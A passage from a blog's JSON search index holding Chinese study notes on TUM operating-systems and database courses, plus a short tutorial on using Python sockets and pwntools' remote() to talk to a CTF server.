0或”dom0”），其他VMs通过这台VM访问I&#x2F;O设备，而不是直接访问硬件。 直接 I&#x2F;O 访问（Direct I&#x2F;O）使用硬件支持的 I&#x2F;O 设备多路复用（Multiplexing）。 I&#x2F;O-MMU（I&#x2F;O 内存管理单元） 负责管理 Guest VM 的设备内存： 负责 I&#x2F;O 地址和中断（Interrupt）的映射。 隔离 DMA（直接内存访问）请求，防止 VMs 互相干扰。 优势： Guest VM 直接访问物理设备，提高 I&#x2F;O 效率。 部分 I&#x2F;O 处理由硬件完成，减少 Hypervisor 负担。 单根 I&#x2F;O 虚拟化（Single Root I&#x2F;O Virtualization, SR-IOV）I&#x2F;O 设备本身支持虚拟化，将 一个物理设备拆分为多个虚拟功能（ Virtual Functions，VF），会绕过Hypervisor的I&#x2F;O处理。 Gast VM 看到的是一个独立的 I&#x2F;O 设备，但实际上它共享了同一个物理设备。 （感觉大部分虚拟化的技术都是通过减轻Hypervisor的负担来提高效率的） 进程虚拟机（Process Virtual Machines）跟系统虚拟机不同的是，进程虚拟机（Process VM）只给单个（或者多个）进程提供虚拟运行环境，使应用程序可以独立于底层操作系统和硬件架构运行。 Runtime会给用户空间进程（User-Space-Prozesse）提供虚拟运行环境，并且负责实现 ABI接口（由系统调用接口（Systemcall Interface）和用户指令集架构（User-ISA）组成）。简单来讲就是Runtime需要负责转换&#x2F;翻译Systemcall和ISA的指令。 对应用程序来说，整个“系统”由 ABI 接口决定，而不依赖底层硬件或操作系统。 Runtime是类似于Hypervisor的中间层，但他们的核心作用之类的完全不一样。 进程虚拟机的优势： 仿真（Emulation）：程序可以在不同 ISA（指令集架构）上运行。 平台无关性（Plattform-Unabhängigkeit）：程序可以在不同 OS 运行。 性能优化（Performance-Optimierung）：二进制优化器（Binary Optimizer）会优化代码。 **高级语言虚拟机（High-Level-Language VMs, HLL VMs）**作为进程虚拟机的一种，会提供一个与底层架构无关的虚拟 ISA（ Plattform-unabhängige virtuelle ISA），使得应用程序不依赖特定的操作系统（OS）和硬件架构。主要是为了运行高级编程语言的代码。 比如说 Java Virtual Machine (JVM) 可以解释和执行 Java 字节码（Java Bytecode），让 Java 代码可以在 Windows、Linux、Mac 等不同平台 上运行。 如果多个进程需要共享资源并相互交互（interagieren），则通常使用操作系统级虚拟化（OS-level Virtualization）。 操作系统级虚拟化（OS-level-Virtualization）操作系统级虚拟化（OS-level-Virtualization）可以运行多个隔离的应用进程，共享同一个操作系统（OS）。 Container Leichtgewichtige Virtualisierungsmöglichkeit 轻量化 stellen eine Laufzeitumgebung für User-Space-Prozesse bereit BS wird nicht virtualisiert Isolation von Prozessen möglich Container是OS-Level Virtualization的一种实现。 在传统的 Unix 操作系统中，一些资源是全局管理的，比如说PID, UID (User ID), IP-Addresse, Host- und NIS-Domainnamen，使得具有 root 权限的进程可以访问和影响其他进程，带来安全隐患。所以希望将他们隔离开。 Namespaces 是 Container 的基础：抽象出对系统全局资源的访问 （比如说Filesystem-Mount-Points, Netzressourcen, PIDs, etc.），将所有进程拆成disjoint subsets，使得每个subset里的进程会认为自己是整个系统中唯一的进程。 Jede Ressource ist eindeutig innerhalb eines Namespace-Containers Bestandteile von Container unter LinuxNamespaces作用：Benennung und Adressierung von Ressourcen，实现进程级别的资源隔离。 主要负责隔离。 在实际应用中，我们不总是需要隔离所有系统资源。因此，Linux 提供了多个独立的 Namespace，以实现更灵活的隔离方式，并避免不必要的资源浪费： UTS: Unix Time Sharing (System) Isolieren System-Identifier (z.B.Host- und Domainnamen 主机名和域名) 例如，在 Docker 容器中，每个容器可以拥有自己的主机名，而不会影响宿主机。 IPC: Inter-Process Communication isolieren IPC-Ressourcen 隔离进程间通信、 例如，不同的容器不能访问彼此的共享内存和消息队列，提高安全性。 Network: isolieren Netzressourcen 隔离网络设备、IP 地址、端口、路由表等，允许不同 Namespace 拥有独立的网络栈。 PID: isolieren PID-Räume Prozesse in unterschiedlichen PID-Namespaces können dieselbe PID haben, aber eindeutig innerhalb eines PID-Namespace Es können verschachtelte (engl. nested) PID-Namespaces erstellt werden 可以套娃 在同一 PID 命名空间内，进程可以正常通信；在不同 PID 命名空间之间，父 Namespace 可以向子 Namespace 发送信号，但子 Namespace 不能影响父 Namespace。 Mount: isolieren Mount-Points des Dateisystems 隔离文件系统挂载点，允许不同的 Namespace 看到不同的文件系统视图。 （在 Linux 中，挂载点（Mount Point） 是指将一个文件系统连接到目录结构中的特定位置，使其内容可以通过该目录访问。） 挂载类型 (Mount-Typ)： Shared Mount 共享挂载：接收+传递 该挂载点的 mount 和 umount 事件会在 Peer Group 之间传播。 例如，在 Shared Mount 上挂载一个新目录，所有共享该挂载点的进程都会看到这个变更。 Private Mount 私有挂载：不接收+不传递 挂载点不会接收，也不会向对等组（Peer Groups）传递事件。 Der Mount-Point empfängt und leitet keine Events zu Peer Groups weiter. Slave Mount 从属挂载：接收+不传递 Slave-Mount-Points empfangen Events von einer Master Peer Group. Unbinable Mount 不可绑定挂载： Ist ein Private Mount, der nicht gebunden (Bind Mount) werden kann. 不能被绑定的私人挂载。 (Bind Mount指的是允许将一个目录或文件挂载到另一个位置，使其在多个路径下可见。) Peer Groups（对等组）：Peer Group 是一组共享 mount 事件的挂载点，当一个 Shared Mount 被创建时，它会被添加到某个 Peer Group。所有 Peer Group 内的挂载点都会同步 mount 和 umount 事件。 User: isolieren User- und Group-IDs 隔离用户 ID 和权限 Erhöhte Privilegien sind nur innerhalb des User Namespace gültig. können auch verschachtelte User-Namespaces erstellt werden. 套娃 例如，容器内的 root 实际上是宿主机的普通用户，增强安全性。 Linux Control Groups (cgroups)主要负责限制。 作用： cgroups unterteilen Prozesse in hierarchische Gruppen 将进程划分为层次化的组 分配( Allozieren )和分发( verteilen )每一组的系统资源 （CPU, 内存等） 资源由独立的 cgroup 子系统表示 Jedes Subsystem verwaltet eine Hierarchie an Prozessgruppen Accounting Überwacht Seiten, die von den Prozessgruppen verwendet werden 监控进程使用的内存 Kontrolle weiche Speichergrenzen 确保内存页会被回收（但不是强制的，即在系统压力下会优先释放，但不会立即强制回收） harte Speichergrenzen 会触发 Out-of-Memory-Killer 所有该 cgroup 内的进程会被冻结。 OOM Killer 可能会终止进程或调整内存限制。 如果内存使用量下降到限制以下，进程可以恢复运行。 Secure Computing Mode (Seccomp)用于限制进程可以执行的系统调用（System Calls）。 提供 3 种模式： Disabled： 未启用，可以调用所有 System Call Strict： 只能调用4个：read(), write(), exit() 和 sigreturn() （sigreturn() 是一个 系统调用（syscall），用于 从信号处理程序（signal handler）返回到被中断的进程上下文。） 调用其他的会触发SIGKILL信号。 Filter： 只能使用被过滤过的System Call。 Filter会基于Berkeley Packet Filter (BPF)。 库操作系统（Library OS）其实虚拟机（VM）和Container还是有些问题的： 通用性（Universell）：内核（Kernel）并未针对特定应用进行优化。 额外开销（Overhead）：包含未使用的组件，带来以下问题： 镜像（Abbilder，指的是 VM 或容器的系统镜像（System Image），包含操作系统和应用程序的文件。）过大会导致部署（Deployment，指的是 将 VM 或容器的镜像部署到运行环境中的过程。）变慢。 攻击面（Angriffsfenster）过大，增加安全风险。 容器通常只为一个用户提供一个应用，所以包含许多不必要的功能。 所以我们可以考虑将 VM 作为一个应用进行编译（即 Library OS），用于创建一个最小化、专门针对特定应用优化的虚拟机。 Library OS 会像一个库（Bibliothek）一样运行。在编译过程中，仅包含所需的功能，整个系统可以通过编译器进行优化。一般只会运行一个进程（但支持多线程）。 Library OS 的理念可以理解为：将每个应用程序所依赖的 OS(操作系统) 的 personality(特性) 作为 library(库) ，使其独立地运行在该应用程序的地址空间上。 这种VM 被称为 Unikernel，意味着所有执行都在内核模式（Kernel Mode）进行，并且只有一个地址空间，因为整个 Unikernel 就是一个单进程应用。 缺点：应用程序必须经常进行调整（angepasset werden），因为它们在内部调用其他应用程序，但架构不支持这种调用。核心原因就是不支持多个进程交互。","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme, Operating System, 操作系统, 虚拟化, 虚拟机, container","slug":"Betriebssysteme-Operating-System-操作系统-虚拟化-虚拟机-container","permalink":"http://example.com/tags/Betriebssysteme-Operating-System-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%99%9A%E6%8B%9F%E5%8C%96-%E8%99%9A%E6%8B%9F%E6%9C%BA-container/"}]},{"title":"GBS-1-Einführung","slug":"TUM笔记/GBS/GBS-1-Einführung","date":"2025-03-11T17:15:25.000Z","updated":"2025-03-18T12:15:41.861Z","comments":true,"path":"2025/03/11/TUM笔记/GBS/GBS-1-Einführung/","permalink":"http://example.com/2025/03/11/TUM%E7%AC%94%E8%AE%B0/GBS/GBS-1-Einf%C3%BChrung/","excerpt":"操作系统基础相关笔记","text":"Grundlagen: Betriebssysteme und SystemsoftwareAufgabe der Informatik:","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme, Operating System, 操作系统","slug":"Betriebssysteme-Operating-System-操作系统","permalink":"http://example.com/tags/Betriebssysteme-Operating-System-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"Datenbank 笔记","slug":"TUM笔记/Datenbank/Datenbank-笔记","date":"2025-03-11T10:37:03.000Z","updated":"2025-03-24T19:56:12.481Z","comments":true,"path":"2025/03/11/TUM笔记/Datenbank/Datenbank-笔记/","permalink":"http://example.com/2025/03/11/TUM%E7%AC%94%E8%AE%B0/Datenbank/Datenbank-%E7%AC%94%E8%AE%B0/","excerpt":"数据库基础相关笔记","text":"1. Datenbankentwurf / ER-ModellierungEntity-relationship diagram Funktionalitäten: 1:1, 1:N, N:1, N:M Min-Max: (min,max) Multiplizität 2. Das Relationale ModellSchlüssel, Primärschlüssel Relationen mit gleichem Schlüssel kann man zusammenfassen. Anomalie: 异常 Die Relationale Algebra Selektion Projektion (会自动去重) Kreuzprodukt Join (Verbund) Umbenennung Mengendifferenz Division Vereinigung Mengendurchschnitt Semi-Join (linkes Argument wird gefiltert) (筛选左表，仅保留在右表中有匹配记录的左表行。) Semi-Join (rechtes Argument wird gefiltert) Anti-Semi-join ⟕ linker äußerer Join (会保留左表中的所有记录，即使在右表中没有匹配的记录时，右表对应的位置会以 NULL 填充。) ⟖ rechter äußerer Join ⟗ (voller) äußerer Join Der Relationenkalkül (relationaler Tupelkalkül) Bsp.: Der Domänenkalkül Bsp.: ü Diese 3 Sprachen sind gleich mächtig 3. SQLstandadisierte -Datendefinitions (DDL)- -Datenmanipulations (DML)- -Anfrage (Query)-Sprache Datendefinition (DDL)Datentypen: character(n), char(n) character varying(n), varchar(n) numeric(p,s), integer, decimal p（precision，精度）：数值的总位数（包含小数点前后的所有数字）。 s（scale，小数位数）：小数部分的位数（小数点后的位数）。 blob oder raw – für sehr große binäre Daten clob – für sehr große String-Attribute date – für Datumsangaben xml – für XML-Dokumente 1234create table Professoren ( PersNr integer not null, Name varchar(30) not null, Rang character(2)); DatenmanipulationEinfügen von Tupeln 1234insert into hörenselect MatrNr, VorlNrfrom Studenten, Vorlesungenwhere Titel = 'Logik'; 12insert into Studenten (MatrNr, Name)values (28121, 'Archimedes'); Löschen von Tupeln 12delete Studentenwhere Semester &gt; 13; Verändern von Tupeln 12update Studentenset Semester = Semester + 1; Anfrage123select (distinct) asfromwhere and Sortieren: 123select PersNr, Name, Rangfrom Professorenorder by Rang desc, Name asc; Mengenoperation: 1union, intersect, minus 12345selectfromwhere (not) exists (select from where)where not in () 比较： 1(where) value &gt;= ALL(子查询) Aggregationsfunktion: 1avg, max, min, count, sum Gruppierung: 1234selectfrom(where)group by Alle in der select-Klausel aufgeführten Attribute - außer den aggregierten - auch in der group by-Klausel aufgeführt werden. 比如说下面这里的gelesenVon, Name： 12345select gelesenVon, Name, sum(SWS)from Vorlesungen, Professorenwhere gelesenVon = PersNr and Rang = 'C4'group by gelesenVon, Name having avg(SWS) &gt;=3; Casting: 12cast(expression AS target_data_type)cast(h.AnzProVorl as decimal(6,2)) Allquantor und Implikation: Auswertung bei NULL-Werten and, between, in (1,2,3,4) like mit Platzhalter: “%” (für beliebig biele Zeichen) “_” (für genau ein Zeichen) case left/right/full outer join Rekursion Vorgänger des „Wiener Kreises“ der Tiefe n: 1234567891011select v1.Vorgängerfrom voraussetzen v1, ... voraussetzen vn_minus_1, voraussetzen vn, Vorlesungen vwhere v1.Nachfolger = v2.Vorgänger and ... vn_minus_1.Nachfolger = vn.Vorgänger and vn.Nachfolger = v.VorlNr and v.Titel = 'Der Wiener Kreis'; Mit Rekursion: 123456789101112131415161718192021with recursive TransVorl (Vorg, Nachf) as ( -- 递归的基础查询（初始层级） select Vorgänger, Nachfolger from voraussetzen union all -- 递归部分（从前一层继续查找更深的层级） select t.Vorg, v.Nachfolger from TransVorl t, voraussetzen v where t.Nachf = v.Vorgänger)select Titel from Vorlesungen where VorlNr in ( select Vorg from TransVorl where Nachf in ( select VorlNr from Vorlesungen where Titel = 'Der Wiener Kreis' )); 4. DatenintegritätIntegritätsbedingungen: -Schlüssel -Beziehungskardinalitäten -Attributdomänen -Inklusion bei Generalisierung Referentielle Integrität Fremdschlüssel Änderung von referenzierten Daten: Default 会拒绝执行主键的更改操作 cascade (Kaskadieren): 级联，外键会随着主键的更改一起更改 set NULL Statische Integritätsbedingungen: 12create table Studenten(Semester integer check Semester between 1 and 13) 12create table Prof(Rang character(2) check(Rang in ('C2','C3','C4'))) Konsistenzbedingung: 1234567create table prüfen(MatrNr ···VorNr ···Note ···primary key (MatrNr,VorNr))constraint VorherHören check (···) Trigger: 123456789101112131415161718192021-- 1. create trigger keine Degradierung-- 2.before update on Professorenfor each row-- 3.when (old.Rang is not null)begin-- 4. if :old.Rang = 'C3' and :new.Rang = 'C2' then :new.Rang := 'C3'; end if; if :old.Rang = 'C4' then :new.Rang := 'C4'; end if; if :new.Rang is null then :new.Rang := :old.Rang; end if;end; create trigger Anweisung, gefolgt von einem Namen, der Definition des Auslösers, in diesem Fall bevor eine Änderungsoperation (before update on) auf einer Zeile (for each row) der Tabelle Professoren ausgeführt werden kann, einer einschränkenden Bedingung (when) und einer Prozedurdefinition in der Oracle-proprietären Syntax. Temporale Daten 5. Relationale EntwurfstheorieFunktionale AbhängigkeitenFunctional Dependency (FD) A B C D a4 b2 c4 d3 a1 b1 c1 d1 a1 b1 c1 d2 a2 b2 c3 d2 a3 b2 c4 d3 R:= {A,B,C,D} 假设 : (可以理解成函数的 rechtseindeutig) Super-Schlüssel : ( 生成元) voll funktional abhängig von () : kann nicht mehr verkleinert werden () Kandidaten-Schlüssel: ( 最小生成元) Armstrong-Axiome FD-Hülle einer Attributmenge Kanonische Überdeckung 没有冗余的属性(Attribute)和依赖(Abhängigkeit) Berechnung: 消除右部冗余属性 (, 时仅保留 和 ) 消除左部冗余属性 删除冗余的函数依赖 (，， 时仅保留 和 ) R = R1 R2 2 Korrektheitskriterien für die Zerlegung von Relationenschemata: Verlustlosigkeit Abhängigkeitserhaltung verlustlose Zerlegung: ( R = R1 R2 ) Hinreichende Bedingung für die Verlustlosigkeit einer Zerlegung: oder NormalformenErste Normalform (1NF): Nur atomare Domäne. 都要是singleton，不能出现集合或者重复行 反例： Vater Mutter Kinder Johann Martha {Else, Lucie} Johann Maria {Theo, Josef} Heinz Martha {Cleo} 正例： Vater Mutter Kind Johann Martha Else Johann Martha Lucie Johann Maria Theo Johann Maria Josef Heinz Martha Cleo Zweite Normalform (2NF)： falls jedes Nicht(kandidat)schlüssel-Attribut voll funktional abhängig ist von jedem Kandidatenschlüssel der Relation. 假设R:= {A,B,C,D}的Kandidaten-Schlüssel是{A,B},那么需要满足C,D sind voll funktional abhängig von {A,B}。 只要出现类似{A} {C}之类的就不行了。 可以理解成不能有多余列。 Remark: 如果Kandidaten-Schlüssel只有一个元素，那么一定满足2NF。 反例（1非2）： A B C x a 1 x b 1 y c 2 {A,B}为Kandidaten-Schlüssel。有{A} {C}。 Dritte Normalform (3NF)： wenn für jede für geltende funktionale Abhängigkeit der Form mit und mindestens eine von drei Bedingungen gilt: , d.h., die FD ist trivial Das Attribut ist in einem Kandidatenschlüssel von enthalten – also ist prim ist Superschlüssel von 假如{A,B}是Kandidatenschlüssel，那么可以{C,D} {A}是符合第二条要求的。（但是这个不满足后面的BCNF） 反例（2非3）： A B C D x a 1 n x b 2 m y c 2 m 满足{A,B} {C}， {A,B} {D} voll，所以满足2NF； 有{C} {D}，所以不满足3NF。 Synthesealgorighmus: zerlegen R in R1,…,Rn, sodass: R1,…,Rn verlustlos R1,…,Rn abhägigkeitserhaltend Alle R1,…,Rn in 3NF Boyce-Codd-Normalform (BCNF)： wenn für jede für geltende funktionale Abhängigkeit der Form (FDs) und mindestens eine von drei Bedingungen gilt: , d.h., die FD ist trivial ist Superschlüssel von 反例（3非BCNF）： A B C D x a 1 1 x b 2 1 y a 3 2 y b 2 1 有 AB CD C B 因为B属于Kandidatschlüssel，所以满足3NF，但是不满足BCNF。 Man kann jede Relation verlustlos in BCNF-Relationen zerlegen, aber nicht unbedingt abhägigkeitserhaltend. Dekompositions-Algorithmus Mehrwertige Abhägigkeit (Multivalued Dependency, MVD): 2行对上，2行交叉对应 Jede FD is auch eine MVD: Eine MVD ist trivial iff: oder Vierte Normalform (4NF): falls für jede MVD eine der folgenden gilt: Die MVD ist trivial oder ist Superschlüssel von R 6. Physische DatenorganisationSpeicherhierarchieRegister Cache Hauptspeicher Plattenspeicher Archivspeicher RAIDRedundant Arrays of Independent Disks MTTF, MTTR, MTTDL RAID 0: Striping RAID 1: Spiegelung RAID 0+1(10): Striping und Spiegelung RAID 2: Striping auf Bit-Ebene RAID 3: Striping auf Bit-Ebene mit Paritätsinfo RAID 4: Striping von Blöcken RAID 5: Striping von Blöcken, Verteilung der Paritätsblöcke IndexstrukturenB-BäumeB+-BäumeErweiterbares HashingDynamisches Wachsen möglich Beispiel: gespiegelte binäre PersNr h(004) = 00100000… (4=0…0100) h(006) = 01100000… (6=0…0110) h(048) = 00001100… (48=0…0110000) Globale Tiefe Lokale Tiefe R-Baummehrdimensionalen Zugriffsstrukturen 7. AnfragebearbeitungLogische OptimierungKanonische Übersetzung: SQL Relationale Algebra Äquivalenzerhaltende Transformationsregeln 一共12条 Dependent Join Physische OptimierungNested Loop Joinforeach : ​ foreach : ​ if s.a=r.a then Res:= Res (r s) O(N*M) Block-Nested Loop Algorithmusforeach Block ​ foreach ​ foreach ​ if s.b = r.a then Res:= Res (r s) O(N * M/B) (M/B: Anzahl der Blöcke) Index-JoinVoraussetzung: 其中一个表是sortiert的且有B-Baum O(N * log(M)) Merge-JoinVoraus.: 2个表都是sortiert的 O(N+M) linear Hash-Join选定一个哈希函数h()，计算R.A的值，分配到hash buckets里，然后再计算S.B的值，在哈希桶里匹配。 不需要预先排序 Partitionieren und Hashing的话需要2个哈希函数。 O(N+M) linear Join mit Hashfilter (Bloom-Filter)需要很多个（k个）不同的哈希函数forall : 计算h_i(a) forall 0覆盖1。 会出现False Positive，但是不会出现False Negative Externes SortierenSelektivität Dynamische Programmierung: Phase: Zugriffspläne ermitteln Phase: Join-Pläne ermittel (2-fach, …, n-fach) Phase: Finalisierung 8. TransaktionsverwaltungBegin of Transaction (BOT)：转账开始的标志 read：读存款 write：写入（修改存款，出账入账） commit：转账结束，所有操作festschreiben abort：取消转账，所有状态复原 define savepoint backup transaction: Auf den jüngsten Sicherungspunkt zurücksetzen. commit work rollback work: Alle Änderungen sollen zurückgesetzt werden. ACID: Atomicity (Atomarität)：原子性。 Alles oder Nichts. Consistency：一致性。 Isolation：隔离性。 Durability (Dauerhaftigkeit)：持久性。 所有更改都必须永久存储。Änderungen erfolgreicher Transaktionen dürfen nie verloren gehen. 9. Fehlerbehandlung (Recovery)Fehlerklassifikation Lokaler Fhler in einer noch nicht festgeschriebenen Transaktion Wirkung zurücksetztenR1-Recovery Fehler mit Hauptspeicherverlust Abgeschlossene TAs erhalten bleiben R2-Recovery redo Noch nicht abgeschlossene TAs zurücksetzten R3-Recovery undo Fehler mit Hintergrundspeicherverlust R4-Recovery steal：未提交的事务修改的页面不会被替换。 steal：允许替换缓存中的任何非固定页面。 force：事务提交时立即将数据写入磁盘。 force：修改的数据仍可保留在缓存中，提高性能。 Auswirkung auf Recovery: force force steal - Kein Undo- Kein Redo - Kein Undo- Redo steal - Undo- Kein Redo - Undo- Redo Einbringungsstrategie（数据提交策略）: Update in Place：直接覆盖 Twin-Block-Verfahren：复制整个数据块 Schattenspeicherkonzept：复制修改的页面 Log-Einträge: LSN (Log Sequence Number)：日志序列号 Transaktionskennung(TA_ID) PageID Redo：纪录当前操作（比如说+=50） Undo：当前操作的逆向（比如-=50） PrevLSN：上一个日志记录的指针 [LSN, TransaktionsID, PageID, Redo, Undo, PrevLSN] （中括号） Protokollierung: Physische Protokollierung before-image：修改前的Zustand after-image Logische Protokollierung Undo-Code Redo-Code Log-Information会记录2次以上： Log-Datei R1,R2,R3 Log-Archiv R4 WAL-Prinzip (Write Ahead Log)： Commit前，确保所有相关的日志记录已写入日志文件。 modifizierte Seite auslagern前，确保相关日志记录已写入日志存档（Log-Archiv）。 Winner：在崩溃前已经完成，需要Redo Loser：在崩溃时仍然处于未提交状态，需要Undo Wiederanlauf: Analyse Log-Datei analysieren Winner-Menge ermitteln Loser-Menge ermitteln Redo Undo CLR: Compensating Log Record 用于记录撤销的操作。（给undo的） 简单来说就是为了预防恢复崩溃时发生的其他崩溃。 CLR-Einträge: LSN (Log Sequence Number)：日志序列号 Transaktionskennung(TA_ID) PageID Redo： PrevLSN：上一个日志记录的指针 UndoNxtLSN：Verweis auf die nächste rückgängig zu machende Änderung &lt;LSN, TransaktionsID, PageID, Redo, PrevLSN, UndoNxtLSN&gt; （尖括号） 注意：CLR没有undo信息。 3种Sicherungspunkte(-Qualitäten)： transaktionskonsistent （事务一致） 所有已提交的事务都被完全存储，未提交的都没有被写入磁盘。（只在所有活跃事务完成后进行检查点记录） aktionskonsistent （操作一致） 可能包含未提交的事务，但是所有操作都是完整的。 unscharf (fuzzy) 修改的页面不会立即写入磁盘，只记录“脏页”的信息，而不是数据本身 DirtyPages (Menge der modifizierten Seiten, 尚未写入磁盘), MinDirtyPageLSN, MinLSN R4-Recovery 10. MehrbenutzersynchronisationFehler (bei unkontroliertem Mehrbenutzerbetrieb): Lost Update: Verlorengegangene Änderungen Dirty Read: Abhängigkeit von nicht freigegebenen Änderungen Phantomproblem HistorieSeiralisierbarkeit 2 Historien äquivalent: wenn sie die Konfliktoperationen der nicht abgebrochenen Transaktionen in derselben Reihenfolge ausführen. SR: Eine Historie ist serialisierbar wenn sie äquivalent zu einer seriellen Historie Hs ist. Eine Historie H serialisierbar der zugehörige Serialisierbarkeitsgraph SG(H) azyklisch ist. liest von in der Historie H RC: rücksetzbare Historie kaskadierendes Rücksetzen (Cascading Rollback)： 假如T2读取了T1里被修改过但是还未被提交（commit）的数据，那么当T1 abort的时候，也需要abort T2。 ACA: Historien ohne kaskadierendes Rücksetzen (avoiding cascading abort) ST: Strikte Historien 想要对一个被修改过的对象进行操作前，必须要确保其已经被commit或者abort了。 Sperrbasierte Synchronisation （锁）Sperrmodi: S (shared, read lock) 允许多个事务（Transaktion）同时读取数据，但不能进行写操作。 X (exclusive, write lock) 允许事务对数据进行读取和写入，但其他事务不能同时访问该数据。 Verträglichkeitsmatrix / Kompatibilitätsmatrix: NL S X S ✅（兼容） ✅ ❌ X ✅ ❌（不兼容） ❌ Zwei-Phasen-Sperrprotokoll: Wachstumsphase：只获取锁 Schrumpfphase：只释放锁 Strenges Zwei-Phasen-Sperrprotokoll: 所有锁直到事务提交（commit）或回滚（abort）后才释放，避免级联回滚。 Verklemmungen (Deadlocks) Erkennung: Wartegraph Vermeidung: Preclaiming durch Zeitstempel Wound-Wait Strategie Wait-Die Strategie Multi-Granularity Locking (MGL) Phantomproblem: Zugriffsweg sperren Zeitstempel-basierende SynchronisationreadTS(A)：上次读取 A的时间戳。 writeTS(A)：上次写入 A 的时间戳。 Synchronisationsverfahren: 当 Ti 试图读取数据 A (ri(A))： 若 TS(Ti)&lt;writeTS(A)，则 Ti必须被回滚（因为 AAA 可能已被更新）。 否则，Ti可以继续读取，并更新 readTS(A) = max(TS(Ti), readTS(A))。 当 Ti 试图写入数据 A (wi(A))： 若 TS(Ti)&lt;readTS(A)，说明在 Ti之前已经有其他事务读取了 A，则 Ti 必须回滚。 若 TS(Ti)&lt;writeTS(A)，说明 Ti 试图覆盖一个更新的值，必须回滚。 否则，Ti可以写入，并更新 writeTS(A) = TS(Ti)。 Optimistische Synchronisation Lesephase Validierungsphase（验证） Schreibphase Snapshot Isolation Synchronisation von Indexstrukturen: zu aufwendig, redundante Transaktionsverwaltung in SQL92isolation level: read uncommited read commited repeatable read serializable","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"Dantenbank 数据库","slug":"TUM课程笔记/Dantenbank-数据库","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Dantenbank-%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"Datenbank, Database, 数据库, SQL","slug":"Datenbank-Database-数据库-SQL","permalink":"http://example.com/tags/Datenbank-Database-%E6%95%B0%E6%8D%AE%E5%BA%93-SQL/"}]},{"title":"与服务器的交互","slug":"与服务器的交互","date":"2025-03-10T19:22:29.000Z","updated":"2025-03-11T10:36:08.425Z","comments":true,"path":"2025/03/10/与服务器的交互/","permalink":"http://example.com/2025/03/10/%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E4%BA%A4%E4%BA%92/","excerpt":"使用socket.socket()与remote（）连接服务器","text":"socket.socketsocket 是 Python 标准库中的模块，用于进行 TCP&#x2F;UDP 连接。 假设服务器地址是 example.com，端口是 1234： 123456789101112131415161718192021import socket# 1. 创建一个TCP sockets = socket.socket()# 2. 连接远程服务器# connect的参数要求为一个tupels.connect((&quot;example.com&quot;, 1234))# 3. 发送数据（例如发送 &quot;Hello&quot;）# sendall() 默认发送的是 bytes 类型的数据，所以需要 b&quot;&quot; 或者 &quot;&quot;.encodes.sendall(b&quot;Hello\\n&quot;)# 4. 接收服务器返回的数据# 这个参数按需调节就好data = s.recv(1024) # 一次接收 1024 字节print(&quot;Received:&quot;, data.decode())# 5. 关闭连接s.close() 如果服务器会发送非常多的内容，则需要一直循环接收服务器发送的消息： 123456789101112131415161718192021import sockets = socket.socket()s.connect((&quot;example.com&quot;, 1234))# 持续接收数据，直到服务器关闭连接data = b&quot;&quot; # 用于存储完整的接收数据while True: part = s.recv(1024) # 每次读取 1024 字节 if not part: # 如果 part 为空，表示服务器关闭连接 break data += part # 累加数据# 按行分割并逐行打印lines = data.decode().splitlines()for line in lines: print(line)s.close() 也可以使用time.sleep()来确保收到完整信息： 12345678910111213141516import socketimport times = socket.socket()s.connect((&quot;example.com&quot;, 1234))s.sendall(b&quot;Hello\\n&quot;)time.sleep(0.5)data = s.recv(1024)print(&quot;Received:&quot;, data.decode())s.close() SSL连接 SSL 连接会比普通的TCP连接（socket.socket()）多一步加密的步骤 123456789101112131415161718import socketimport sslsock = socket.socket()# 使用 SSL 加密 sockets = ssl.wrap_socket(sock)s.connect((&quot;example.com&quot;, 1234))s.sendall(b&quot;Hello\\n&quot;)data = s.recv(1024)print(&quot;Received:&quot;, data.decode())s.close() pwntools的remotepwntools 是专门为 Pwn 题目设计的 Python 库，封装了 socket。 123456789101112131415from pwn import *# 1. 连接服务器r = remote(&quot;example.com&quot;, 1234)# 2. 发送数据r.sendline(b&quot;Hello&quot;) # 自动添加 &#x27;\\n&#x27;# 3. 接收数据response = r.recvall() # 读取所有信息# response = r.recvline() # 读取一整行print(&quot;Received:&quot;, response.decode())# 4. 关闭连接r.close() 比起socket，pwn拥有更高级的功能： 12345678910r.recvuntil(b&quot;\\n&quot;) #一直读数据，直到匹配特定字符串。# p.recvuntil(b&quot;Enter your name:&quot;)r.interactive() # 进入交互模式#比如说在pwn的题目里如果成功打开了shell（system(&quot;/bin/sh&quot;)），进入交互模式则可以直接手动执行命令。response = r.recvall()# recvall会自动读取所有可用数据 直到服务器关闭连接。不再需要像原生 socket 那样手写 while True 循环。r.sendafter(b&quot;input:&quot;, b&quot;1234&quot;) # 先等待服务器发送 input:，然后再发送 1234 remote() 里也可以启用 SSL： 12345678910from pwn import *r = remote(&quot;example.com&quot;, 1234, ssl=True) # 开启 SSL 加密r.sendline(b&quot;Hello&quot;) # 自动添加 &#x27;\\n&#x27;response = r.recvline()print(&quot;Received:&quot;, response.decode())r.close() 总的来说，在做CTF题目时，pwn的remote可以完成所有与服务器的交互。 